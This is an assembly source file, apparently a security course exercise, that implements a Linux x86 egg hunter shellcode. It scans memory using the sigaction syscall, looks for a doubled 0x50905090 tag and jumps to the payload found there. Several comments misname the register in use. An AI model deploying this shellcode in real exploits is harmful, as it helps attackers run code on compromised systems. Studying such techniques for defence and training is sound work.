; Filename: egg_hunter_shellcode.nasm
; Author: Kunal Pachauri
; SLAE-9237

global _start ; Making the Entry point accessible 

section .text
_start: ; Entry Point

	xor ecx, ecx	; Zeroing out EDX, will use the value in register as the address  to be validated

page_align:

	or cx, 0xfff	; Result in setting lower 16 bytes of EDX i.e 4095

next_address:

	inc ecx		; Increment EDX (4095+1 i.e Increasing by Page size)
	push 0x43	; SYSCALL Number for sigaction i.e 67
	pop eax		; Loading syscall in EAX
	int 0x80	; Performing Interrupt

check_efault:

	cmp al, 0xf2	; 0xf2 represents return value as EFAULT, checking against it
	jz page_align	; If we get EFAULT, then we need to increase the page number i.e increasing address by 4096
			; Else, we need to continue and check for the presence of EGG on that memory address
check_egg:
	
	mov eax, 0x50905090	; Loading our Egg Tag to compare -> nop,push eax combination
	mov edi, ecx		; Since scasd compares the string in EAX and EDI, moving the validated address in EDI
	scasd			; Compares the string, If equal then sets Zero Flag
	jnz next_address	; If Egg is not found, increement the address and repeat the above steps
	scasd			; If Egg is matched, check next four bytes are also Egg to make sure it is not finding the egg tag itself
	jnz next_address	; If Egg is not found, it was the tag itself, increment address and repeat
	jmp edi			; Egg is found, redirect execution to shellcode
